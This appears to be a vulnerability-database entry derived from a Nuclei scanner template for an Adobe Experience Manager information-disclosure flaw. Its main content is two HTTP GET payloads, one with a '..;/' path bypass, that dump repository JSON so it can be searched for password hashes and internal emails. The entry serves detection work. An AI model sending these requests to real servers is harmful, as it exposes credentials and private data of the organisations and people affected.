# Vulnerability: AEM Secrets - Sensitive Information Disclosure
**Classification:** AEM
**Source:** Nuclei Template (`aem-secrets.yaml`)

## Description
Possible Juicy Files can be discovered at this endpoint. Search / Grep for secrets like hashed passwords ( SHA ) , internal email disclosure etc.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
GET {{BaseURL}}/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
```

